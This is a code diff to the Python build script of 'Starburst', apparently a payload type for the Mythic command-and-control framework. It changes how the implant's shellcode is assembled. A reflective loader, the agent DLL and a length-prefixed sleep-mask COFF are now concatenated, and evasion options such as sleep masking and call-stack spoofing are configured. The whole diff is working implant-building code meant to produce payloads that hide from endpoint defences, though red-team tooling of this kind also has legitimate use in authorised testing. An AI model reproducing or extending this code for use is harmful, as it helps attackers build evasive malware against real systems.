@@ -469,27 +469,33 @@ class Starburst(PayloadType):
             except Exception:
                 lt = "default"
             if lt == "udrl-vs":
-                mask = "none"
+                mask = "sleepmask_vs"
             if mask == "sleepmask_vs":
                 sm_data_path = os.path.join(dst_path, "include", "evasion", "sleepmask_vs_data.h")
                 if lt == "udrl-vs":
-                    sm_coff = await self._compile_udrl_vs_mask(agent_build_path, arch)
-                else:
-                    sm_coff = await self._compile_sleepmask_vs(agent_build_path, arch)
-                if sm_coff:
-                    with open(sm_coff, "rb") as f:
-                        sm_bytes = f.read()
-                    hex_vals = ", ".join(f"0x{b:02x}" for b in sm_bytes)
+                    # UDRL-VS: mask COFF is appended to the payload by the linker,
+                    # not embedded in agent source. Write a no-op header.
                     with open(sm_data_path, "w") as f:
                         f.write("#ifndef STARBURST_SLEEPMASK_VS_DATA_H\n")
                         f.write("#define STARBURST_SLEEPMASK_VS_DATA_H\n")
-                        f.write("#define SLEEPMASK_VS_COFF_DATA_DEFINED\n")
-                        f.write(f"static const uint8_t SLEEPMASK_VS_COFF[] = {{ {hex_vals} }};\n")
-                        f.write(f"static const uint32_t SLEEPMASK_VS_COFF_SIZE = {len(sm_bytes)};\n")
                         f.write("#endif\n")
-                    logger.info(f"Sleepmask-VS COFF embedded: {len(sm_bytes)} bytes from {sm_coff}")
+                    logger.info("UDRL-VS: mask COFF will be appended to payload (not embedded)")
                 else:
-                    logger.warning("Sleepmask-VS selected but compile/find failed - using placeholder")
+                    sm_coff = await self._compile_sleepmask_vs(agent_build_path, arch)
+                    if sm_coff:
+                        with open(sm_coff, "rb") as f:
+                            sm_bytes = f.read()
+                        hex_vals = ", ".join(f"0x{b:02x}" for b in sm_bytes)
+                        with open(sm_data_path, "w") as f:
+                            f.write("#ifndef STARBURST_SLEEPMASK_VS_DATA_H\n")
+                            f.write("#define STARBURST_SLEEPMASK_VS_DATA_H\n")
+                            f.write("#define SLEEPMASK_VS_COFF_DATA_DEFINED\n")
+                            f.write(f"static const uint8_t SLEEPMASK_VS_COFF[] = {{ {hex_vals} }};\n")
+                            f.write(f"static const uint32_t SLEEPMASK_VS_COFF_SIZE = {len(sm_bytes)};\n")
+                            f.write("#endif\n")
+                        logger.info(f"Sleepmask-VS COFF embedded: {len(sm_bytes)} bytes from {sm_coff}")
+                    else:
+                        logger.warning("Sleepmask-VS selected but compile/find failed - using placeholder")
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -551,16 +557,16 @@ class Starburst(PayloadType):
                     shellcode, arch, agent_build_path)
                 if cp_result is None:
                     resp.status = BuildStatus.Error
-                    resp.build_message = "Crystal Palace linking failed"
+                    resp.build_message = "Shellcode linking/wrapping failed"
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Wrapping",
-                        StepStdout="Crystal Palace linking failed",
+                        StepStdout="Shellcode linking/wrapping failed",
                         StepSuccess=False,
                     ))
                     return resp
                 resp.payload = cp_result
-                resp.build_message = f"Starburst {arch} Crystal Palace shellcode: {len(cp_result)} bytes"
+                resp.build_message = f"Starburst {arch} shellcode: {len(cp_result)} bytes"
 
             else:
                 linked_sc = await self._link_with_crystal_palace(
@@ -1090,7 +1096,7 @@ class Starburst(PayloadType):
             loader_type = "default"
         if loader_type == "udrl-vs":
             spoof = "off"
-            mask_type = "none"
+            mask_type = "sleepmask_vs"
         if mask_type == "sleepmask_vs":
             spoof = "off"
         if spoof and spoof != "off":
@@ -1122,7 +1128,7 @@ class Starburst(PayloadType):
         except Exception:
             mask = "default"
         if loader_type == "udrl-vs":
-            mask = "none"
+            mask = "sleepmask_vs"
         mask_map = {
             "none": "MASK_NONE",
             "default": "MASK_DEFAULT",
@@ -1424,15 +1430,16 @@ class Starburst(PayloadType):
         cp_path = os.path.join(loaders_path, "crystal-palace")
         crystal_linker = os.path.join(cp_path, "crystal-linker")
 
-        jar_path = os.path.join(crystal_linker, "crystalpalace.jar")
-        if not os.path.exists(jar_path):
-            logger.error("Crystal Palace not installed - place crystalpalace.jar in loaders/crystal-palace/crystal-linker/")
-            return None
-
         try:
             loader_type = self.get_parameter("loader_type") or "default"
         except Exception:
             loader_type = "default"
+
+        if loader_type != "udrl-vs":
+            jar_path = os.path.join(crystal_linker, "crystalpalace.jar")
+            if not os.path.exists(jar_path):
+                logger.error("Crystal Palace not installed - place crystalpalace.jar in loaders/crystal-palace/crystal-linker/")
+                return None
 
         if loader_type == "crystal-kit":
             try:
@@ -1547,8 +1554,18 @@ class Starburst(PayloadType):
             with open(dll_path, "rb") as f:
                 dll_bytes = f.read()
 
-            result = loader_sc + dll_bytes
-            logger.info(f"UDRL-VS linked: {len(loader_sc)} loader + {len(dll_bytes)} DLL = {len(result)} bytes")
+            mask_coff = await self._compile_udrl_vs_mask(build_path, arch)
+            mask_coff_bytes = b""
+            if mask_coff:
+                with open(mask_coff, "rb") as f:
+                    mask_coff_bytes = f.read()
+                logger.info(f"UDRL-VS mask COFF: {len(mask_coff_bytes)} bytes")
+            else:
+                logger.warning("UDRL-VS mask compile failed, payload will have no sleep mask")
+
+            import struct
+            result = loader_sc + dll_bytes + struct.pack("<I", len(mask_coff_bytes)) + mask_coff_bytes
+            logger.info(f"UDRL-VS linked: {len(loader_sc)} loader + {len(dll_bytes)} DLL + {len(mask_coff_bytes)} mask = {len(result)} bytes")
             return result
 
         else:
